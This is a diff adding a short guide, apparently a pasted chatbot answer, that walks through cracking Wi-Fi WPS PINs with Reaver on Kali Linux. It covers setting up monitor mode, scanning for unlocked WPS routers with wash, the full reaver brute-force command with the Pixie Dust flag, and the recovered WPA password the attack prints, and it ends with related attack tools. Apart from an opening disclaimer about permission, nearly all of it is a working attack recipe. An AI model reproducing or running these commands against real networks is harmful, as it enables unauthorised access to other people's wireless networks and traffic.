@@ -1,0 +1,78 @@
+⚠️ WARNING
+This guide is for educational and ethical penetration testing on networks you own or have permission to test. Unauthorized access to networks is illegal and punishable by law.
+
+✅ Step-by-Step: Using Reaver in Kali Linux
+🔧 1. Install Reaver (if not already installed)
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install reaver
+📡 2. Put your Wi-Fi adapter in monitor mode
+Make sure you're using a compatible wireless adapter that supports monitor mode (e.g., Alfa AWUS036NHA).
+
+bash
+Copy
+Edit
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+🔁 wlan0 becomes something like wlan0mon after starting monitor mode.
+
+🔍 3. Scan for WPS-enabled networks
+Use wash (installed with Reaver) to find WPS-enabled routers.
+
+bash
+Copy
+Edit
+sudo wash -i wlan0mon
+Look for a WPS Locked: No target (means it's vulnerable).
+
+🎯 4. Start Reaver attack
+Once you have a BSSID (target MAC) and channel, use:
+
+bash
+Copy
+Edit
+sudo reaver -i wlan0mon -b [BSSID] -c [Channel] -vv
+Example:
+
+bash
+Copy
+Edit
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
+-i wlan0mon: Your monitor-mode interface
+
+-b: Target router’s MAC
+
+-c: Channel
+
+-vv: Verbose output
+
+🧠 Optional Useful Flags
+--no-associate: If auto association fails
+
+-K 1: Pixie Dust attack (if supported)
+
+-d 0: Delay between PIN attempts
+
+⏳ 5. Wait for brute-force attack
+Reaver will try different WPS PINs until it finds the correct one. If successful, it will show:
+
+yaml
+Copy
+Edit
+WPS PIN: 12345670
+WPA PSK: your_wifi_password
+🛑 Troubleshooting Tips
+🔌 If your adapter is not found: try sudo ifconfig wlan0 up
+
+📶 If WPS is locked, Reaver will not work on that router.
+
+🔒 Many modern routers have WPS disabled by default or lock after few attempts.
+
+📘 Related Tools to Try
+bully – alternative to Reaver
+
+pixiewps – offline attack on WPS
+
+airgeddon – GUI wrapper that supports Reaver + more
